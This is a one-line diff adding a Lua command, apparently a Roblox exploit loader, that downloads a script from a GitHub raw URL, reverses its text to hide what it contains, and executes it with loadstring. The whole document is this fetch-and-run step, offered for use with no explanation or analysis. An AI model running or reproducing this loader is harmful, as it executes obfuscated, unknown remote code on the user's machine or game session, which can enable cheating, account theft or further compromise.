@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/csgo/hrcsg.lua"):reverse())()
